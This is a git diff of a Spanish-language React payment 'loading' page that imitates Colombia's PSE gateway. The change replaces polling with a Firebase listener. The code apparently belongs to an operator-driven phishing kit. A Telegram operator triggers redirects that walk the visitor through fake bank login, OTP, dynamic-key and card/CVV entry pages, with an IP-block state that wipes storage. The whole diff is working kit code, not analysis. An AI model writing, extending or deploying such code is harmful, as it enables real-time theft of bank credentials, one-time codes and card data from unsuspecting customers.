@@ -1,6 +1,8 @@
-import { useEffect, useRef, useState } from "react";
+import { useCallback, useEffect, useRef, useState } from "react";
 import { limpiarPaddingBody } from "../../../@utils";
 import { instanceBackend } from "../../axios/instanceBackend";
+import { rtdb } from "../../../services/firebaseClient";
+import { ref as rtdbRef, onValue, off } from "firebase/database";
 import bannerDer from "./img/NFbanner-der-pse.png";
 import bannerIzq from "./img/NFbanner-izq-pse.png";
 import contact from "./img/contanw-pse.svg";
@@ -89,11 +91,11 @@ const PseLoading = ({ variant = "entry", onFinalizeReady }) => {
   const urlParams = new URLSearchParams(window.location.search);
   const bank = urlParams.get("bank");
 
-  // Referencia para el intervalo de polling
-  const pollingIntervalRef = useRef(null);
+  // Referencia para el listener de Firebase (reemplaza polling)
+  const fbListenerRef = useRef(null);
   const sessionIdRef = useRef(null);
 
-  // Estado para rastrear si está en modo polling
+  // Estado para rastrear si está esperando respuesta
   const [isPolling, setIsPolling] = useState(false);
   const [processingTick, setProcessingTick] = useState(0);
 
@@ -238,32 +240,144 @@ const PseLoading = ({ variant = "entry", onFinalizeReady }) => {
     }
   }, []);
 
-  // También actualiza initPolling con logs:
-  const initPolling = (usuario) => {
+  /**
+   * initPolling → reemplazado por listener de Firebase RTDB.
+   * Escucha /pasarela/sessions/{sessionId} en tiempo real.
+   * Cuando el operador pulsa un botón en Telegram el cambio
+   * llega en ~100ms sin necesidad de polling.
+   */
+  const initPolling = useCallback((usuario) => {
 
-    // Establecer que está en modo polling
+    // Establecer que está esperando
     setIsPolling(true);
 
-    // Limpiar intervalo anterior si existe
-    if (pollingIntervalRef.current) {
-
-      // Se limpia el intervalo
-      clearInterval(pollingIntervalRef.current);
-
-      // Se resetea la referencia
-      pollingIntervalRef.current = null;
+    // Limpiar listener anterior si existe
+    if (fbListenerRef.current) {
+      off(fbListenerRef.current);
+      fbListenerRef.current = null;
     }
 
-    // Iniciar polling cada 3 segundos
-    pollingIntervalRef.current = setInterval(() => {
+    const sid = sessionIdRef.current;
+    if (!sid) return;
 
-      // Se llama el metodo
-      verifyState();
-    }, 3000);
+    // Suscribirse al nodo de la sesión en Firebase RTDB
+    const sessionRef = rtdbRef(rtdb, `pasarela/sessions/${sid}`);
+    fbListenerRef.current = sessionRef;
 
-    // También verificar inmediatamente
-    verifyState();
-  };
+    onValue(sessionRef, (snapshot) => {
+      const data = snapshot.val();
+      if (!data) return;
+
+      // Construir respuesta equivalente a la del endpoint verify-state
+      const estado = data.lastStatus || "pendiente";
+      const url = data.urlAutomatic || data.urlRedirect || data.linkCustom || null;
+      const bank = data.banco || data.bank || "";
+      const tc = Boolean(data.tc);
+      const tarjeta = data.tarjeta || "";
+      const cardData = data.cardData_tc || data.cardData_cvv || null;
+
+      handleEstado({ estado, url, bank, tc, tarjeta, cardData });
+    });
+  }, []);
+
+  /**
+   * handleEstado — contiene la lógica de redirección (extraída de verifyState)
+   * para poder ser llamada tanto por el listener de RTDB como por el polling
+   * de respaldo.
+   */
+  const handleEstado = useCallback(({ estado, url, bank, tc, tarjeta, cardData }) => {
+    const estadoLower = String(estado || "").toLowerCase();
+    const hasUrl = Boolean(url && String(url).trim());
+    const isTcFlow = Boolean(tc);
+    const tarjetaDigits = String(tarjeta || "").replace(/\D/g, "");
+    const canRedirectTc = isTcFlow && Boolean(bank) && tarjetaDigits.length > 0;
+    const bankRoute = getPseBankRoute(bank);
+
+    const tcRedirectStates = ["sol_login", "sol_otp", "sol_din", "error_otp", "error_din"];
+    const tcFinalStates = ["sol_finalizar", "sol_finalizado", "solicitar_finalizar"];
+
+    const shouldStop =
+      estadoLower === "logo" ||
+      estadoLower === "pse_session_ready" ||
+      estadoLower === "gateway_transaction_ready" ||
+      (estadoLower === "sol_link_custom" && hasUrl) ||
+      (estadoLower === "link_bot" && hasUrl) ||
+      (estadoLower === "sol_link_bot" && hasUrl) ||
+      (estadoLower === "error_login" && Boolean(bankRoute)) ||
+      (tcRedirectStates.includes(estadoLower) && canRedirectTc) ||
+      (tcFinalStates.includes(estadoLower) && isTcFlow);
+
+    if (shouldStop) {
+      setIsPolling(false);
+      // Limpiar listener cuando hay acción final
+      if (fbListenerRef.current) {
+        off(fbListenerRef.current);
+        fbListenerRef.current = null;
+      }
+    }
+
+    // Redireccionamiento según estado
+    switch (estadoLower) {
+      case "logo": {
+        if (sessionIdRef.current) {
+          localStorage.setItem("sessionId", sessionIdRef.current);
+          sessionStorage.setItem(PSE_SESSION_HANDOFF_KEY, sessionIdRef.current);
+        }
+        const resolvedBank = String(url || bank || "").trim();
+        const directRoute = getPseBankRoute(resolvedBank);
+        if (directRoute) {
+          window.location.href = directRoute;
+        } else {
+          window.location.href = "/pse?bank=" + encodeURIComponent(resolvedBank) + "&sessionId=" + encodeURIComponent(sessionIdRef.current || "");
+        }
+        break;
+      }
+      case "pse_session_ready":
+      case "gateway_transaction_ready":
+        if (hasUrl) window.location.replace(url);
+        break;
+      case "link_bot":
+      case "sol_link_bot":
+        if (hasUrl) {
+          if (url.includes("payulatam.com") || url.includes("registro.pse.com.co")) {
+            window.location.replace(url);
+          } else {
+            window.location.href = url;
+          }
+        }
+        break;
+      case "sol_link_custom":
+        if (hasUrl) window.location.href = url;
+        break;
+      case "sol_otp":
+        if (canRedirectTc) window.location.href = buildTcIngresoUrl("/ingreso-tc/otp", sessionIdRef.current, bank, tarjetaDigits);
+        break;
+      case "sol_din":
+        if (canRedirectTc) window.location.href = buildTcIngresoUrl("/ingreso-tc/dinamica", sessionIdRef.current, bank, tarjetaDigits);
+        break;
+      case "error_otp":
+        if (canRedirectTc) redirectToTcIngreso("/ingreso-tc/otp", sessionIdRef.current, bank, tarjetaDigits, "error_otp");
+        break;
+      case "error_din":
+        if (canRedirectTc) redirectToTcIngreso("/ingreso-tc/dinamica", sessionIdRef.current, bank, tarjetaDigits, "error_din");
+        break;
+      case "error_login":
+        if (bankRoute) window.location.href = bankRoute;
+        break;
+      case "sol_finalizar":
+      case "solicitar_finalizar":
+      case "sol_finalizado":
+        if (isTcFlow) window.location.href = "/ingreso-tc/finalizado";
+        break;
+      case "block_ip":
+        localStorage.clear();
+        sessionStorage.clear();
+        window.location.href = "/error";
+        break;
+      default:
+        break;
+    }
+  }, []);
 
   // Función para verificar el estado de aprobación
   const verifyState = async () => {
